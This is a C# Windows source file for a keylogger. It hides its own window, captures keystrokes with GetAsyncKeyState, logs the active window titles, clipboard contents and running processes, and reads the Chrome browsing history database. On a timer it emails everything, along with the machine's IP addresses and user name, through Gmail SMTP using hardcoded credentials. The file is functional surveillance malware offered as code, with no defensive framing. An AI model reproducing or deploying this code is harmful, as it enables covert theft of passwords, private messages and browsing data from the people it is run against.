using System;
using System.Runtime.InteropServices;
using System.Windows;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Data;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Threading;

namespace Keylogger
{
    public class HistoryItem
    {
        public string URL { get; set; }

        public string Title { get; set; }

        public DateTime VisitedTime { get; set; }
    }

    public struct checkBoxes
    {
        public bool ipAdd, apps, keys, copied, history;
        public checkBoxes(bool _ipAdd, bool _apps, bool _keys, bool _copied, bool _history)
        {
            ipAdd = _ipAdd;
            apps = _apps;
            keys = _keys;
            copied = _copied;
            history = _history;
        }
    }
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        String emailTo;

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        uint lastProc;

        private bool ChromeExists = false;

        public MainWindow()
        {
            InitializeComponent();
        }

        private void StartTracking_Click(object sender, RoutedEventArgs e)
        {
            checkBoxes boxes = new checkBoxes((bool)IpAdd.IsChecked, (bool)Apps.IsChecked, (bool)Keys.IsChecked, (bool)Copied.IsChecked, (bool)History.IsChecked);
            emailTo = emailToSend.Text;
            string timeString = timeBetweenEmails.Text;
            string timeAutodestructString = timeToAutodestruction.Text;
            if (!checkEmail(emailTo))
            {
                return;
            }
            if (!checkTime(timeString))
            {
                return;
            }
            if (!checkTime(timeAutodestructString))
            {
                return;
            }
            if (!checkCheckBoxes())
            {
                return;
            }
            int time = Convert.ToInt32(timeString);
            int timeAutodestruct = Convert.ToInt32(timeAutodestructString);
            this.Hide();
            //Set path of txt
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            //if(!Directory.Exists(folder))                                                         
            //Directory.CreateDirectory(folder);                                                
            string filepath = System.IO.Path.Combine(folder, "Keylogger");
            if (!System.IO.File.Exists(filepath))
                Directory.CreateDirectory(filepath);
            string pathKeys = (filepath + @"\keystrokes.txt");
            if (!File.Exists(pathKeys))
                using (StreamWriter sw = File.CreateText(pathKeys)) ;
            string pathProcesses = (filepath + @"\processes.txt");
            if (!File.Exists(pathProcesses))
                using (StreamWriter sw = File.CreateText(pathProcesses)) ;
            string pathClipboard = (filepath + @"\clipboard.txt");
            if (!File.Exists(pathClipboard))
                using (StreamWriter sw = File.CreateText(pathClipboard)) ;
            string pathHistoryChrome = (filepath + @"\ChromeHistory.txt");
            if (!File.Exists(pathHistoryChrome))
                using (StreamWriter sw = File.CreateText(pathHistoryChrome)) ;
            File.WriteAllText(pathKeys, string.Empty);//
            File.WriteAllText(pathProcesses, string.Empty);
            File.WriteAllText(pathClipboard, string.Empty);
            File.WriteAllText(pathHistoryChrome, string.Empty);

            //Send email every 1 min
            var startTimeSpan = TimeSpan.Zero;
            var periodTimeSpan = TimeSpan.FromMinutes(time);
            var timer = new System.Threading.Timer((E) =>
            {
                getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
            }, null, startTimeSpan, periodTimeSpan);

            //var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct);
            //var autodestruction = new System.Threading.Timer((E) =>
            //{
            //    System.Environment.Exit(0);
            //}, null, startTimeSpan, timeUntillAutodestruction);

            string clipboardContent = Clipboard.GetText();
            while (true)
            {
                Thread.Sleep(5);
                getKeys(pathKeys);
                getClipboard(clipboardContent, pathClipboard);
            }
        }

        void getMainProcess(StreamWriter sw)
        {
            uint procId = 0;
            IntPtr hWnd = GetForegroundWindow();
            GetWindowThreadProcessId(hWnd, out procId);
            //String str = "";
            if (procId != lastProc)
            {
                var proc = Process.GetProcessById((int)procId);
                //String str = proc.MainModule.ToString().Substring(33);
                String str = proc.MainWindowTitle;
                sw.Write("\n" + str + " -> ");
                lastProc = procId;
            }
        }

        void getKeys(string pathKeys)
        {
            for (int i = 1; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 32769)
                {
                    using (StreamWriter sw = File.AppendText(pathKeys))
                    {
                        getMainProcess(sw);
                        sw.Write(verifyKey(i));
                    }
                }
            }
        }

        void getClipboard(string clipboardContent, string pathClipboard)
        {
            DataObject retrievedData = (DataObject)Clipboard.GetDataObject();
            if (retrievedData != null)
            {
                if (clipboardContent != Clipboard.GetText())
                {
                    clipboardContent = Clipboard.GetText();
                    using (StreamWriter sw = File.AppendText(pathClipboard))
                    {
                        getMainProcess(sw);
                        sw.Write("\n" + clipboardContent);
                    }
                }
            }
        }

        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)                                               //
        {
            File.WriteAllText(pathProcesses, string.Empty);
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                if (!String.IsNullOrEmpty(p.MainWindowTitle))
                {
                    using (StreamWriter sw = File.AppendText(pathProcesses))
                    {
                        sw.WriteLine(p.MainWindowTitle);
                    }
                }
            }
            checkIfChrome(processes, pathHistoryChrome);
            SendNewMessage(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
            File.WriteAllText(pathKeys, string.Empty);
            File.WriteAllText(pathProcesses, string.Empty);
            File.WriteAllText(pathClipboard, string.Empty);
            File.WriteAllText(pathHistoryChrome, string.Empty);
        }

        void SendNewMessage(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)
        {
            string logKeys = File.ReadAllText(pathKeys);
            string logProcesses = File.ReadAllText(pathProcesses);
            string logClipboard = File.ReadAllText(pathClipboard);
            string logHistoryChrome = File.ReadAllText(pathHistoryChrome);

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            string emailBody = "";

            var host = Dns.GetHostEntry(Dns.GetHostName());
            if (boxes.ipAdd)
            {
                foreach (var address in host.AddressList)
                {
                    emailBody += "\nAddress: " + address;
                }
            }
            //emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nUser: " + Environment.UserName;
            emailBody += "\nTime: " + now.ToString();
            if (boxes.apps)
                emailBody += "\nOpen apps: \n" + logProcesses;
            if (boxes.keys)
                emailBody += "\nKeys pressed: \n" + logKeys;
            if (boxes.copied)
                emailBody += "\nCopied text: \n" + logClipboard;                                //
            if (boxes.history)
                emailBody += "\nWeb History from Chrome: \n" + logHistoryChrome;


            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("testkeyloggerapp@gmail.com", "parolatest1234");

            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
            mailMessage.To.Add(emailTo);
            //mailMessage.To.Add("ionescumarius1600@gmail.com");
            mailMessage.Subject = subject;
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }

        String verifyKey(int code)
        {
            String key = "";

            if (code == 8) key = "[Back]";
            else if (code == 9) key = "\t";
            else if (code == 13) key = "\n";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = " ";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 1) key = "";//[LClick]
            else if (code == 2) key = "";//[RClick]
            else if (code == 16) key = "[Shift]";
            else if (code == 17) key = "[Ctrl]";
            else if (code == 18) key = "[Alt]";
            else if (code == 110) key = ".";
            else if (code == 91) key = "[Windows]";
            else if (code > 64 && code < 91)
                return ((char)(code + 32)).ToString();
            else if (code > 47 && code < 58)
                return ((char)code).ToString();
            else key = "[" + code + "]";

            return key;
        }

        private void emailInfo_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("This is the email where the information about user actions will be sent.");
        }

        private void timeInfo_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("This is the time in minutes between emails sent to given address.");
        }

        bool checkEmail(string email)
        {
            if (String.IsNullOrEmpty(email))
            {
                MessageBox.Show("Insert a mail");
                return false;
            }

            string verifmail = "@";
            if (!email.Contains(verifmail))
            {
                MessageBox.Show("Mail address is invalid.");
                return false;
            }
            return true;
        }

        bool checkTime(string time)
        {
            if (String.IsNullOrEmpty(time))
            {
                MessageBox.Show("Insert a number in time box.");
                return false;
            }
            try
            {
                int t = Convert.ToInt32(time);
            }
            catch
            {
                MessageBox.Show("Value inserted in the time box is invalid(must be a number).");
                return false;
            }
            return true;
        }

        bool checkCheckBoxes()
        {
            if (!((bool)IpAdd.IsChecked || (bool)Apps.IsChecked || (bool)Keys.IsChecked || (bool)Copied.IsChecked || (bool)History.IsChecked))
            {
                MessageBox.Show("Please check at least one option.");
                return false;
            }
            return true;
        }

        private void timeAutodestruction_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("This is the time the keylogger will run(in minutes) until it will autodestruct itself.");
        }

        private void checkIfChrome(Process[] procese, string pathHistoryChrome)
        {

            if (ChromeExists == false)
            {
                foreach (Process p in procese)
                {
                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
                    {
                        if (p.ProcessName == "chrome")
                        {
                            ChromeExists = true;
                        }

                    }
                }
            }
            else
            {
                bool processesChromeRunning = false;
                foreach (Process p in procese)
                {
                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
                    {
                        if (p.ProcessName == "chrome")
                        {
                            processesChromeRunning = true;
                        }
                    }
                }
                if (processesChromeRunning == false)
                {
                    getHistoryChrome(pathHistoryChrome);
                }
            }
        }

        private List<HistoryItem> ShowHis()
        {
            string chromeHistoryFile = (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)) + @"\Google\Chrome\User Data\Default\History";
            if (File.Exists(chromeHistoryFile))
            {
                SQLiteConnection connection = new SQLiteConnection
                ("Data Source=" + chromeHistoryFile + ";Version=3;New=False;Compress=True;");

                connection.Open();

                DataSet dataset = new DataSet();

                SQLiteDataAdapter adapter = new SQLiteDataAdapter
                ("select * from urls order by last_visit_time desc", connection);
                adapter.Fill(dataset);
                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
                {
                    DataTable dt = dataset.Tables[0];
                    List<HistoryItem> allHistoryItems = new List<HistoryItem>();

                    foreach (DataRow historyRow in dt.Rows)
                    {
                        HistoryItem historyItem = new HistoryItem();
                        {
                            historyItem.URL = Convert.ToString(historyRow["url"]);
                            historyItem.Title = Convert.ToString(historyRow["title"]);
                        };

                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);
                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);
                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
                        historyItem.VisitedTime = localTime;

                        allHistoryItems.Add(historyItem);
                    }
                    return allHistoryItems;
                }
                return null;
            }
            return null;
        }

        private void getHistoryChrome(string pathHistoryChrome)
        {
            using (StreamWriter sw = File.AppendText(pathHistoryChrome))
            {
                sw.WriteLine("\n--START--\n");
                List<HistoryItem> list = ShowHis();
                int cnt;
                if (50 > list.Count)
                    cnt = list.Count;
                else
                    cnt = 50;

                for (int i = 0; i < cnt; i++)
                {
                    sw.WriteLine(i+1 + ") " + list[i].VisitedTime + " -> " + list[i].URL);
                }
                sw.WriteLine("\n--END--\n");
            }

        }

        /////////////get req/////////////////////////////////////////

        //[DllImport("kernel32.dll", SetLastError = true)]
        //[return: MarshalAs(UnmanagedType.Bool)]
        //static extern bool AllocConsole();

        //private void getReq_Click(object sender, RoutedEventArgs e)
        //{
        //    AllocConsole();
        //    Console.WriteLine("ceva");

        //    if (!HttpListener.IsSupported)
        //    {
        //        Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
        //        return;
        //    }
        //    // URI prefixes are required,
        //    var prefixes = new List<string>() { "http://*:8089/","https://*:8443/"  };

        //    // Create a listener.
        //    HttpListener listener = new HttpListener();
        //    // Add the prefixes.
        //    foreach (string s in prefixes)
        //    {
        //        listener.Prefixes.Add(s);
        //    }
        //    listener.Start();
        //    Console.WriteLine("Listening...");
        //    while (true)
        //    {
        //        Thread.Sleep(100);
        //        // Note: The GetContext method blocks while waiting for a request.
        //        HttpListenerContext context = listener.GetContext();

        //        HttpListenerRequest request = context.Request;

        //        string documentContents;
        //        using (Stream receiveStream = request.InputStream)
        //        {
        //            using (StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8))
        //            {
        //                documentContents = readStream.ReadToEnd();
        //            }
        //        }
        //        Console.WriteLine($"Recived request for {request.Url}");
        //        Console.WriteLine(documentContents);

        //        // Obtain a response object.
        //        HttpListenerResponse response = context.Response;
        //        // Construct a response.
        //        string responseString = "<HTML><BODY> Hello world!</BODY></HTML>";
        //        byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
        //        // Get a response stream and write the response to it.
        //        response.ContentLength64 = buffer.Length;
        //        System.IO.Stream output = response.OutputStream;
        //        output.Write(buffer, 0, buffer.Length);
        //        // You must close the output stream.
        //        output.Close();
        //    }
        //    listener.Stop();

        //}
    }
}
